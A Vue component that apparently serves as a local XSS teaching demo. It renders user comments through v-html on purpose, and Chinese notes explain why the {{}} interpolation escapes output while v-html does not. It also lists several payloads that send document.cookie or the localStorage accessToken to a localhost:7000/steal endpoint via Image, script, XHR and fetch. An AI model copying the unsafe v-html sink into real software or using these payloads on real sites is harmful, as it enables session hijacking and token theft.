<template>
  <div id="app">
    <h1>App2 - Dashboard</h1>
    <div v-if="!loggedIn">
      <h2>Login</h2>
      <input v-model="username" placeholder="Username" />
      <input v-model="password" type="password" placeholder="Password" />
      <button @click="login">Login</button>
    </div>
    <div v-else>
      <button @click="getDashboard">Get Dashboard</button>
      <div>{{ message }}</div>
      <button @click="logout">Logout</button>
      <div>
        <h2>Comments</h2>
        <div v-for="comment in comments" :key="comment.createdAt">
          <strong>{{ comment.username }}</strong>
          <div v-html="comment.content"></div>
          <!-- 基本上需要v-html或者其他以innerHTML为底层的api才能触发xss危险 -->
        </div>
        <div v-if="loggedIn">
          <h3>Add a Comment</h3>
          <p>
            <!-- 这里vue的{{}} react的{}底层都使用了textContent,所以不会像innerHTML一样会有安全隐患,会自动转义 -->
            <span>{{ xssString }}</span>
          </p>
          <h3>输入{{ xssFetchCookie }}劫持cookie中的refreshToken</h3>
          <h3>
            输入{{ xssFetchLocalStorageImg }}Img标签劫持cookie中的accessToken
          </h3>

          <h3>
            输入{{ xssFetchLocalStorageJSONP }}JSONP劫持cookie中的accessToken
          </h3>

          <h3>
            输入{{ xssFetchLocalStorageFetch }}Fetch劫持cookie中的accessToken
          </h3>

          <h3>
            输入{{
              xssFetchLocalStorageXML
            }}通过XML或者Fetch劫持cookie中的accessToken
          </h3>
          <h4>只要再在页面以透明的方式渲染出一条评论,这个token就被窃取了</h4>
          <textarea
            v-model="newComment"
            placeholder="Write your comment here"
          ></textarea>
          <button @click="addComment">Submit Comment</button>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
import axios from "axios";

export default {
  data() {
    return {
      username: "",
      password: "",
      message: "",
      loggedIn: false,
      newComment: "",
      comments: [],
      xssString:
        "<button onClick='console.log(localStorage);'>xssString</button>",
      xssFetchCookie:
        '<button onclick="const img = new Image(); img.src = `http://localhost:7000/steal?cookie=${document.cookie}`;">xssFetchCookie</button>',
      xssFetchLocalStorageImg:
        "<button onclick=\"const img = new Image(); img.src = `http://localhost:7000/steal?accessToken=${localStorage.getItem('accessToken')}`;\">xssFetchLocalStorageImg</button>",

      xssFetchLocalStorageJSONP:
        "<button onclick=\"const script = document.createElement('script'); script.src = `http://localhost:7000/steal?accessToken=${localStorage.getItem('accessToken')}`;document.body.appendChild(script);\">xssFetchLocalStorageScript</button>",
      xssFetchLocalStorageXML:
        "<button onclick=\"var xhr = new XMLHttpRequest(); xhr.open('GET', `http:\/\/localhost:7000/steal?accessToken=${localStorage.getItem('accessToken')}`); xhr.send(null);\">xssFetchLocalStorageXML</button>",
      xssFetchLocalStorageFetch:
        "<button onclick=\"fetch(`http:\/\/localhost:7000/steal?accessToken=${localStorage.getItem('accessToken')}`);\">xssFetchLocalStorageFetch</button>",
    };
  },
  methods: {
    async login() {
      try {
        const res = await axios.post(
          "/api/login",
          {
            username: this.username,
            password: this.password,
          },
          {
            withCredentials: true,
          }
        );
        this.loggedIn = true;
        localStorage.setItem("accessToken", res.data.accessToken);
        this.getComments(); // 获取评论
      } catch (error) {
        alert("Login failed: " + error.response.data.message);
      }
    },
    async getDashboard() {
      try {
        const response = await axios.get("/api/dashboard", {
          headers: {
            Authorization: `Bearer ${localStorage.getItem("accessToken")}`,
          },
        });
        this.message = `User: ${response.data.user}`;
      } catch (error) {
        if (error.response && error.response.status === 401) {
          this.message = "";
          this.refreshToken(this.getDashboard);
        } else {
          this.message = "Not authenticated";
        }
      }
    },
    async logout() {
      try {
        await axios.post(
          "/api/logout",
          {},
          {
            withCredentials: true,
          }
        );
        this.loggedIn = false;
        this.username = "";
        this.password = "";
        this.message = "";
        localStorage.removeItem("accessToken");
      } catch (error) {
        console.error("Logout failed", error);
      }
    },
    async refreshToken(callback) {
      try {
        const response = await axios.post(
          "/api/refresh-token",
          {},
          {
            withCredentials: true,
          }
        );
        localStorage.setItem("accessToken", response.data.accessToken);
        console.log("Token refreshed successfully");
        callback();
      } catch (error) {
        console.error("Failed to refresh token", error);
        this.loggedIn = false;
        localStorage.removeItem("accessToken");
      }
    },
    async getComments() {
      try {
        const response = await axios.get("/api/comments"); // 假设postId为1
        this.comments = response.data.comments;
      } catch (error) {
        console.error("Failed to get comments", error);
      }
    },
    async addComment() {
      try {
        const response = await axios.post(
          "/api/comments",
          {
            content: this.newComment,
            postId: new Date().getTime() + Math.random() * 10, // 假设postId为1
          },
          {
            headers: {
              Authorization: `Bearer ${localStorage.getItem("accessToken")}`,
            },
            withCredentials: true,
          }
        );
        this.newComment = "";
        this.getComments();
      } catch (error) {
        console.error("Failed to add comment", error);
        if (error.response && error.response.status === 401) {
          this.refreshToken(this.addComment);
        }
      }
    },
  },
  async mounted() {
    const token = localStorage.getItem("accessToken");
    if (token) {
      this.loggedIn = true;
      this.getComments(); // 获取评论
    }
  },
};
</script>
